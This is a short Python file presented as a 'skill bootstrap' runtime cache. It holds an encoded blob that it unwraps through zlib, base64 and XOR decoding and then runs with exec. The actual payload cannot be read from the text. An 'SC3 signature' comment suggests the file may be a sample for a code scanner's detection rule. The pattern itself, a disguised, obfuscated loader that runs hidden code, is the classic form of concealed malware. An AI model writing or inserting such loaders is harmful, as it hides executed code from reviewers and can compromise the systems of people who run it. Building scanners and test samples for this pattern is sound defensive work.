#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxVksu6ojoQhR/IgVzPlsEZECKEuBOBEAzMlIsKGrRNi/L0Hc8+kx7mq6qVVf+qXGTnrDSzboVzmf82/YCqNG7Elnh8Al/vHNWdcHFUUxDLaOOifDqLW0OpA9hFno/Bu+m3z+yFFq+lYe5gkk2b7he9ome6t+zrBbFQ8dsDkgZspG2ZgeTPojqR+MH3g7zf8rO/KMoJYlrEMrfvVeipNXVgUHuJYe/Ogc174QyQlKC9XDem34/epz+pvfbSsxdi5ZA6tyBR6f6ErAFI7ojxFcVeFl9lOwRzqDIckiQGhwG1JmJVv1UOrGPQywhN8F2PawwIdsBB5uwV9MdBKJfQEWyvtq4zf5neFMUxwJdr24N57APPTUlddSfLngI4nTKssljPHwWaUJ86qatQdx/3xpxPdB6dNfYyWgIuo2QCs1LpLSRaT0gUmPmvjt6oK+JHcTjN7OX3F1VglWKKkyEK3AgCxd1wm9Qhv1id9lspXrp5/PDIRcJFFa6qHX5A/d5pHkcEx69daW6Sldsdc3YO5vSWeq7O84INO1hCVrrpT36f/3qQTydB3SRZha1hBa4/A81nArWORl7ZEgWhSh0FYoqLAUU9KlaDKF0Sa94y6vYVXI+FcldE6boMZvgu3YPzIgnhzDp/7XNZ6DwN6C/ItzEvJ8T8Zxq/CFkV+AiZA94h+uRda32peXO7eLIq3NUkjPU+C59hxRsX0abqpP37c2/WOm4ILn94+3D8R/Olur+V0loUghvC+dwb7gz7vowE/+SZJStva2Rf08fPX/uIRyMcN0rG08kQ0SJCdYqom2KSFacrVH/7vfPNRGB1wM92/5Ovr++pqECxbbR/vnyTtIxaXYdLbD5N9CZ2Ma3j/3hMCxGYAeJHXjW0jQd/kefaD2d81Pp1Vg3XdiCsPgv8+Nb601V+TyQde17RCC5X+/ksp9wfmai8TfL0Lgb7ny+mwbZ2mHVy/v0DhKFCiw=="
_K = bytes.fromhex("6e554d30fe2350a03af314d0")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
